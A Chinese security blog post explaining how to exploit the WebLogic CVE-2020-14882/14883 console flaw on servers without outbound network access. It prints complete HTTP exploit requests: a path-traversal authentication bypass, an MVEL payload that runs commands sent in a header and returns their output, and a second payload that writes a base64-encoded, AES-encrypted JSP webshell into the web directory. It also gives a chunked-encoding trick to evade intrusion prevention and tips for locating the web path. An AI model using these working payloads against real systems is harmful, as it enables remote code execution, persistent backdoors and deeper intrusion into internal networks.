#  聊聊关于weblogic不出网的一些小操作

原创 JC  [ JC的安全之路 ](javascript:void\(0\);)

**JC的安全之路** ![]()

微信号 csec527

功能介绍 一个安全从业者的想法见解 ，每周随缘更新1-2篇

____

___发表于_

收录于合集

#weblogic 1 个

#安全小技巧 6 个

  

**前言**  
  

 **起因是在某项目上，碰到CVE-2020-14882，内心窃喜，但主机上装了虚拟化防入侵，漏扫确实扫不出来，尬住，于是有了此文。**

  

 **01** **谈谈cve-2020-14882  
**

  

内网碰到cve-2020-14882或者cve-2020-14883漏洞的时候，大部分是没有防御的，这时候可以先试试权限绕过。

poc

  * 

    
    
    /console/css/%252e%252e%252fconsole.portal

![](https://gitee.com/fuli009/images/raw/master/public/20230623141144.png)

如果存在权限绕过，并且版本大于12，那么就可以回显（仅凭个人经验来说的话），10.0版本虽然也可以命令执行，但是并没有现成可供改造的exp（一般碰到还是反弹shell为主）。

当碰到纯内网环境下，目标环境不出网，并且暂时还没有其他可达的段的主机权限，那么就是G；全版本通用的办法是有，但那本质上也是加载xml，反弹shell，所以还是G。  
  

![](https://gitee.com/fuli009/images/raw/master/public/20230623141145.png)  

说到这里，其实谈到版本的问题。大多数时候我们遇到都是下面这种情况：  

![](https://gitee.com/fuli009/images/raw/master/public/20230623141146.png)

因为不知道有无漏洞，先盲打一手，如果存在WAF呢，Paylaod给你拦截了，自动化扫描没有结果，那是不是没有漏洞呢，其实是否定的，这种就需要针对性的打。  
对于版本的识别，推荐一个很好用的小工具：

  * 

    
    
    https://github.com/woodpecker-appstore/weblogic-infodetector

![](https://gitee.com/fuli009/images/raw/master/public/20230623141147.png)

这个插件可以很方便的探测T3协议，以及版本信息，得到版本信息之后，可以尝试找相关的CVE打打。  
  
或者使用superman的工具尝试打打（en，他那个工具没有14882，但有时候蜜汁操作，有时候可以乱杀），最近深蓝战队的那个weblogicTools也还可以，但仅限于打点的时候用一下，当内网socks代理的时候会出现蜜汁“网络错误”，这让我大受震撼。  
话不多说，下面是针对weblogic版本12以上的回显代码：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal HTTP/1.1Host: 192.168.200.73:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closecmd:idCookie: ADMINCONSOLESESSION=80df-PIfHsjyIOy9wn4vYU-gTRCDA_Y04nPNexR553_6Ivoww0xr!1975875885Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 1238  
    _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if (cmd != null) {String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write("");}executeThread.interrupt();");

![](https://gitee.com/fuli009/images/raw/master/public/20230623141148.png)

这一段代码本身没啥问题，但是主机上有不知道哪家厂商的虚拟化防入侵，发包就G，还得绕一下，后面发现分块传输可以Bypass一下。但也仅限于命令执行，咱们还是想进一步打深层内网的。只能先考虑写文件，但是由于高级的webshell（哥斯拉，冰蝎以及部分自研的管理工具）体积较大，不好通过echo的方式写（echo其实也可以，只要不怕被流量抓住，echo那种蚁剑的一句话，因为http协议在header头部字段传输的内容是有限的，超出一定长度就g了），于是简单的复盘了一下，实现文件流写马的方式。  
由于笔者JAVA比较菜，不会写exp，只好求助一下 **ChatGPT** ，GPT也是很给力，简单修了一下就改好并实现文件流写入，数据包如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal HTTP/1.1Host: 192.168.200.73:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closex-write-file:deflateCookie: ADMINCONSOLESESSION=80df-PIfHsjyIOy9wn4vYU-gTRCDA_Y04nPNexR553_6Ivoww0xr!1975875885Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 4879  
    _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(" weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("x-write-file"); if (cmd != null) { String result = "PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IFN0cmluZyBwYXNzPSJwYXNzMTAyNCI7IFN0cmluZyBtZDU9bWQ1KHBhc3MreGMpOyBjbGFzcyBYIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7cHVibGljIFgoQ2xhc3NMb2FkZXIgeil7c3VwZXIoeik7fXB1YmxpYyBDbGFzcyBRKGJ5dGVbXSBjYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGNiLCAwLCBjYi5sZW5ndGgpO30gfXB1YmxpYyBieXRlW10geChieXRlW10gcyxib29sZWFuIG0peyB0cnl7amF2YXguY3J5cHRvLkNpcGhlciBjPWphdmF4LmNyeXB0by5DaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUyIpO2MuaW5pdChtPzE6MixuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyh4Yy5nZXRCeXRlcygpLCJBRVMiKSk7cmV0dXJuIGMuZG9GaW5hbChzKTsgfWNhdGNoIChFeGNlcHRpb24gZSl7cmV0dXJuIG51bGw7IH19IHB1YmxpYyBzdGF0aWMgU3RyaW5nIG1kNShTdHJpbmcgcykge1N0cmluZyByZXQgPSBudWxsO3RyeSB7amF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0IG07bSA9IGphdmEuc2VjdXJpdHkuTWVzc2FnZURpZ2VzdC5nZXRJbnN0YW5jZSgiTUQ1Iik7bS51cGRhdGUocy5nZXRCeXRlcygpLCAwLCBzLmxlbmd0aCgpKTtyZXQgPSBuZXcgamF2YS5tYXRoLkJpZ0ludGVnZXIoMSwgbS5kaWdlc3QoKSkudG9TdHJpbmcoMTYpLnRvVXBwZXJDYXNlKCk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt9cmV0dXJuIHJldDsgfSBwdWJsaWMgc3RhdGljIFN0cmluZyBiYXNlNjRFbmNvZGUoYnl0ZVtdIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHtDbGFzcyBiYXNlNjQ7U3RyaW5nIHZhbHVlID0gbnVsbDt0cnkge2Jhc2U2ND1DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7T2JqZWN0IEVuY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXRFbmNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZVRvU3RyaW5nIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NEVuY29kZXIiKTsgT2JqZWN0IEVuY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZSIsIG5ldyBDbGFzc1tdIHsgYnl0ZVtdLmNsYXNzIH0pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSBwdWJsaWMgc3RhdGljIGJ5dGVbXSBiYXNlNjREZWNvZGUoU3RyaW5nIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHtDbGFzcyBiYXNlNjQ7Ynl0ZVtdIHZhbHVlID0gbnVsbDt0cnkge2Jhc2U2ND1DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7T2JqZWN0IGRlY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZSkge3RyeSB7IGJhc2U2ND1DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7IE9iamVjdCBkZWNvZGVyID0gYmFzZTY0Lm5ld0luc3RhbmNlKCk7IHZhbHVlID0gKGJ5dGVbXSlkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBuZXcgQ2xhc3NbXSB7IFN0cmluZy5jbGFzcyB9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUyKSB7fX1yZXR1cm4gdmFsdWU7IH0lPjwldHJ5e2J5dGVbXSBkYXRhPWJhc2U2NERlY29kZShyZXF1ZXN0LmdldFBhcmFtZXRlcihwYXNzKSk7ZGF0YT14KGRhdGEsIGZhbHNlKTtpZiAoc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInBheWxvYWQiKT09bnVsbCl7c2Vzc2lvbi5zZXRBdHRyaWJ1dGUoInBheWxvYWQiLG5ldyBYKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5RKGRhdGEpKTt9ZWxzZXtyZXF1ZXN0LnNldEF0dHJpYnV0ZSgicGFyYW1ldGVycyIsZGF0YSk7amF2YS5pby5CeXRlQXJyYXlPdXRwdXRTdHJlYW0gYXJyT3V0PW5ldyBqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSgpO09iamVjdCBmPSgoQ2xhc3Mpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInBheWxvYWQiKSkubmV3SW5zdGFuY2UoKTtmLmVxdWFscyhhcnJPdXQpO2YuZXF1YWxzKHBhZ2VDb250ZXh0KTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDAsMTYpKTtmLnRvU3RyaW5nKCk7cmVzcG9uc2UuZ2V0V3JpdGVyKCkud3JpdGUoYmFzZTY0RW5jb2RlKHgoYXJyT3V0LnRvQnl0ZUFycmF5KCksIHRydWUpKSk7cmVzcG9uc2UuZ2V0V3JpdGVyKCkud3JpdGUobWQ1LnN1YnN0cmluZygxNikpO30gfWNhdGNoIChFeGNlcHRpb24gZSl7fQ0KJT4="; byte[] decodedBytes = java.util.Base64.getDecoder().decode(result); String decodedResult = new String(decodedBytes); java.io.File file = new java.io.File("/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/shell.jsp"); java.io.FileWriter writer = new java.io.FileWriter(file); writer.write(decodedResult); writer.flush(); writer.close();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream("success"));res.getServletOutputStream().flush();res.getWriter().write(""); } executeThread.interrupt(); ");

  

写文件思路很简单，就是把真正的webshell编码一下，写入时解码写到靶机的指定web目录下：

![](https://gitee.com/fuli009/images/raw/master/public/20230623141149.png)

到这里，简单的连一下shell

![](https://gitee.com/fuli009/images/raw/master/public/20230623141151.png)

也是没问题的。

  

 **02** **小结  
**

  

其实到这里，有人可能问，为什么不用内存马，找web路径多麻烦？事实上吧：一个是内存马有时候遇到不太适配的中间件，大概率会把站打崩，丢权限，血亏；二一个是，笔者其实不太懂内存马，既然不是自己熟悉的领域，问问大佬多好，何必强求呢？

  

 **03** **路径的问题  
**

  

这里的web路径：

  * 

    
    
    /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/shell.jsp

  

路径方面只需要pwd获取当前路径+/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/六个随机字符/war/shell.jsp

大体是这样，如果没有这个路径，可以考虑find命令搜索首页的CSS/JS/PNG图片找web路径。

最后祝大家周末愉快！

![](https://gitee.com/fuli009/images/raw/master/public/20230623141152.png)

  
 **END**  
![]() **扫码关注了解更多** 安全小技巧  
  

  

  

  

  
  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

